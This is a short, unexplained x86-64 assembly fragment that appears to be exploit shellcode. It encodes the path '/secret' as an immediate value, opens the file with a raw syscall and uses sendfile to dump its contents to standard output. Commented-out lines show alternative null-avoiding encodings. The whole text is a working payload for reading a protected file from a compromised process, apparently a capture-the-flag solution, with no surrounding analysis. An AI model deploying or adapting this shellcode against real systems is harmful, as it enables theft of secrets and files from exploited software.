    #mov $0x101010101010101, %rax 
	# 0x7465726365732f
	
    mov $0x7465726365732f, %rax
    push %rax
    #mov 0x17564736264722e, %rax
    #xor %rax, (%rsp)
    push $0x2
    pop %rax
	#mov $0x2, %rax
    mov %rsp, %rdi 
    xor %esi, %esi
lable:
    cdq 
    syscall
    push $0x7f
    pop %r10 
    mov %rax, %rsi 
    #mov $0x28, %rax
    push $0x28
    pop %rax    
    #mov $0x1, %rdi
    push $0x1
    pop %rdi    
    jmp lable

